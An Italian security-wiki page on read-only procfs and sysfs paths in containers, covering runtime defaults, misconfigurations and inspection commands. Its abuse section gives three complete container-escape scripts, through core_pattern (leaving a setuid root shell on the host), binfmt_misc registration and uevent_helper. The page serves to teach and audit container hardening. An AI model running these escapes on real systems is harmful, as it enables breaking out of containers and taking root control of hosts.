# Percorsi di sistema in sola lettura

{{#include ../../../../banners/hacktricks-training.md}}

I percorsi di sistema in sola lettura sono una protezione distinta rispetto ai masked paths. Invece di nascondere completamente un percorso, il runtime lo espone ma lo monta in sola lettura. Questo è comune per alcune posizioni di procfs e sysfs dove l'accesso in lettura può essere accettabile o necessario operativamente, ma le scritture sarebbero troppo pericolose.

Lo scopo è semplice: molte interfacce del kernel diventano molto più pericolose quando sono scrivibili. Un mount in sola lettura non elimina tutto il valore di ricognizione, ma impedisce a un workload compromesso di modificare i file esposti al kernel attraverso quel percorso.

## Funzionamento

I runtime frequentemente marcano parti della vista proc/sys come in sola lettura. A seconda del runtime e dell'host, questo può includere percorsi come:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

La lista effettiva varia, ma il modello è lo stesso: consentire la visibilità dove necessario, negare le modifiche per impostazione predefinita.

## Laboratorio

Ispeziona la lista dei percorsi in sola lettura dichiarati da Docker:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Ispeziona la vista montata di proc/sys dall'interno del container:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Impatto sulla sicurezza

I percorsi di sistema in sola lettura riducono un'ampia classe di abusi che impattano l'host. Anche quando un attaccante può ispezionare procfs o sysfs, l'impossibilità di scriverci elimina molte vie di modifica diretta che coinvolgono parametri del kernel, gestori di crash, helper per il caricamento dei moduli o altre interfacce di controllo. L'esposizione non scompare, ma la transizione dalla divulgazione di informazioni all'influenza sull'host diventa più difficile.

## Configurazioni errate

Gli errori principali sono rimuovere il mascheramento o rimontare percorsi sensibili in lettura-scrittura, esporre direttamente il contenuto host di proc/sys tramite bind mount scrivibili, o usare modalità privilegiata che di fatto aggirano i default del runtime più sicuri. In Kubernetes, `procMount: Unmasked` e i workload privilegiati spesso si presentano insieme a una protezione di proc più debole. Un altro errore operativo comune è presumere che, dato che il runtime di solito monta questi percorsi in sola lettura, tutti i workload ereditino ancora quel default.

## Abuso

Se la protezione è debole, inizia cercando voci scrivibili in proc/sys:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Quando sono presenti voci scrivibili, i percorsi di follow-up ad alto valore includono:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
Cosa possono rivelare questi comandi:

- Voci scrivibili sotto `/proc/sys` spesso significano che il container può modificare il comportamento del kernel dell'host invece di limitarsi a ispezionarlo.
- `core_pattern` è particolarmente importante perché un valore host-facing scrivibile può essere trasformato in un host code-execution path provocando il crash di un processo dopo aver impostato un pipe handler.
- `modprobe` rivela l'helper usato dal kernel per i flussi relativi al caricamento dei moduli; è un classico target ad alto valore quando è scrivibile.
- `binfmt_misc` indica se la registrazione di interpreti custom è possibile. Se la registrazione è scrivibile, questo può diventare un execution primitive invece di solo un information leak.
- `panic_on_oom` controlla una decisione del kernel a livello host e può quindi trasformare l'esaurimento delle risorse in un host denial of service.
- `uevent_helper` è uno dei più chiari esempi di un percorso helper sysfs scrivibile che produce host-context execution.

Scoperte interessanti includono manopole proc rivolte all'host o voci sysfs scrivibili che normalmente dovrebbero essere in sola lettura. A quel punto, il carico di lavoro si è spostato da una vista container limitata verso un'influenza significativa sul kernel.

### Esempio completo: `core_pattern` Host Escape

Se `/proc/sys/kernel/core_pattern` è scrivibile dall'interno del container e punta alla vista del kernel dell'host, può essere abusato per eseguire un payload dopo un crash:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Se il percorso raggiunge realmente il kernel dell'host, il payload viene eseguito sull'host e lascia dietro di sé una setuid shell.

### Esempio completo: `binfmt_misc` Registrazione

Se `/proc/sys/fs/binfmt_misc/register` è scrivibile, la registrazione di un interprete personalizzato può produrre l'esecuzione di codice quando il file corrispondente viene eseguito:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
Su un `binfmt_misc` scrivibile accessibile dall'host, il risultato è l'esecuzione di codice nel percorso dell'interprete avviato dal kernel.

### Esempio completo: `uevent_helper`

Se `/sys/kernel/uevent_helper` è scrivibile, il kernel può invocare un helper nel percorso dell'host quando viene attivato un evento corrispondente:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
Il motivo per cui questo è così pericoloso è che il percorso dell'helper viene risolto dalla prospettiva del filesystem dell'host anziché da un contesto sicuro limitato al solo container.

## Controlli

Questi controlli stabiliscono se l'esposizione di procfs/sysfs è read-only come previsto e se il workload può ancora modificare interfacce sensibili del kernel.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
Cosa c'è di interessante qui:

- Un normale workload hardened dovrebbe esporre pochissime voci scrivibili in /proc/sys.
- I percorsi in /proc/sys scrivibili sono spesso più importanti del semplice accesso in lettura.
- Se il runtime dichiara che un percorso è read-only ma in pratica è scrivibile, rivedi attentamente mount propagation, bind mounts e le impostazioni di privilegio.

## Impostazioni predefinite del runtime

| Runtime / piattaforma | Stato predefinito | Comportamento predefinito | Indebolimenti manuali comuni |
| --- | --- | --- | --- |
| Docker Engine | Abilitato di default | Docker definisce una lista predefinita di percorsi read-only per voci sensibili di proc | esporre mount di host proc/sys, `--privileged` |
| Podman | Abilitato di default | Podman applica percorsi read-only predefiniti a meno che non vengano esplicitamente rilassati | `--security-opt unmask=ALL`, mount estesi dell'host, `--privileged` |
| Kubernetes | Eredita i default del runtime | Usa il modello di percorsi read-only del runtime sottostante a meno che non venga indebolito da impostazioni del Pod o da mount dell'host | `procMount: Unmasked`, workload privilegiati, writable host proc/sys mounts |
| containerd / CRI-O under Kubernetes | Default del runtime | Di solito si affida ai default OCI/runtime | stesso della riga Kubernetes; modifiche dirette alla configurazione del runtime possono indebolire il comportamento |

Il punto chiave è che i percorsi di sistema in sola lettura sono solitamente presenti come default del runtime, ma sono facili da compromettere tramite modalità privilegiate o bind mounts dall'host.
